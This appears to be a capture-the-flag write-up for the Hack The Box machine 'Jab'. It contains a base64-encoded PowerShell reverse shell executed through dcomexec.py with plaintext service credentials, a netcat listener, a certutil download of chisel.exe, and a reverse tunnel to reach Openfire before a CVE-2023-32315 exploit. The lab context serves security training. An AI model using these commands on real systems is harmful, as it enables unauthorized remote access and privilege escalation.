Generate payload `PowerShell #3 (Base64)` on https://www.revshells.com/, then listen on port 9001
`$ rlwrap nc -lvnp 9001  `

Then run it:
`$ python3 dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand`

```
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.4] 49450

PS C:\windows\system32> whoami
jab\svc_openfire
PS C:\windows\system32> type C:\Users\svc_openfire\Desktop\user.txt
c789cc0da643dd61e8a5283324eb7453
PS C:\windows\system32> 
```

# Privilege Escalation
## Enumeration
Get a running process
```
PS C:\windows\system32> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     81       5     2244       3776       0.00   1656   0 cmd                                                          
    159      10     6648      12680       1.75    280   0 conhost                                                      
    158       9     4456       2924              4636   0 conhost                                                      
    455      19     2328       5460               380   0 csrss                                                        
    169      13     1692       4852               492   1 csrss                                                        
    395      33    16780      23780              2692   0 dfsrs                                                        
    158       8     1956       6112              3228   0 dfssvc                                                       
    266      14     3908      13876              3928   0 dllhost                                                      
   5388    2331    69524      69644              2672   0 dns                                                          
    542      22    20392      44772                60   1 dwm                                                          
     53       6     1652       4372              2472   1 fontdrvhost                                                  
     53       6     1528       4148              2480   0 fontdrvhost                                                  
      0       0       56          8                 0   0 Idle                                                         
    477      27    12980      48480              4440   1 LogonUI                                                      
   1980     210    83592      91684               644   0 lsass                                                        
    639      43    29176      53240              2560   0 Microsoft.ActiveDirectory.WebServices                        
    360      24     5888      15896       0.25   1036   0 mmc                                                          
    360      24     5896      15928       0.16   1208   0 mmc                                                          
    360      24     6112      15960       0.14   2736   0 mmc                                                          
    234      13     3068      10464              3116   0 msdtc                                                        
   1434     144   591356     544220              2280   0 openfire-service                                             
    103       7     1320       5088              2708   0 openfire-service                                             
    481      44   115732      81176               880   0 powershell                                                   
    457      25   119276     123184       4.86   1476   0 powershell                
```

Get a running port for `openfire-service`
```
PS C:\windows\system32> netstat -ano | findstr 9090
  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       2280
PS C:\windows\system32> netstat -ano | findstr 9091
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       2280
PS C:\windows\system32> 
```

Try to accesss the web
```
PS C:\windows\system32> certutil.exe -urlcache -f http://127.0.0.1:9090
****  Online  ****
  0000  ...
  0073
    0000  3c 68 74 6d 6c 3e 0a 3c  68 65 61 64 3e 3c 74 69   <html>.<head><ti
    0010  74 6c 65 3e 3c 2f 74 69  74 6c 65 3e 0a 3c 6d 65   tle></title>.<me
    0020  74 61 20 68 74 74 70 2d  65 71 75 69 76 3d 22 72   ta http-equiv="r
    0030  65 66 72 65 73 68 22 20  63 6f 6e 74 65 6e 74 3d   efresh" content=
    0040  22 30 3b 55 52 4c 3d 69  6e 64 65 78 2e 6a 73 70   "0;URL=index.jsp
    0050  22 3e 0a 3c 2f 68 65 61  64 3e 0a 3c 62 6f 64 79   ">.</head>.<body
    0060  3e 0a 3c 2f 62 6f 64 79  3e 0a 3c 2f 68 74 6d 6c   >.</body>.</html
    0070  3e 0a 0a                                           >..
CertUtil: -URLCache command completed successfully.
PS C:\windows\system32> 
```

## Tunneling with Chisel

Download chisel.exe in Localhost
`$ python3 -m http.server 8000`
```
PS C:\Users\svc_openfire\Downloads> certutil.exe -urlcache -f http://10.10.14.12:8000/chisel.exe chisel.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

### Setting Port Forward
Running on localhost
```
$ ./chisel server -p 8050 --reverse
2024/03/09 01:40:12 server: Reverse tunnelling enabled
2024/03/09 01:40:12 server: Fingerprint +gqRUf6ug4Yv1Ql9AleKs8ndJwNEJgTHaoLcINxY2BM=
2024/03/09 01:40:12 server: Listening on http://0.0.0.0:8050
```

Running on Jab Server
```
PS C:\Users\svc_openfire\Downloads> chisel.exe client 10.10.14.12:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
PS C:\Users\svc_openfire\Downloads> 
```

## Observe the Openfire
`$ firefox 127.0.0.1:9090`
Try to login with username `svc_openfire` and password `!@#$%^&*(1qazxsw`

### Search for Openfire Exploit
Refer to: https://github.com/miko550/CVE-2023-32315

Then got Root in the folder `C:/Users/Administrator/Desktop/`
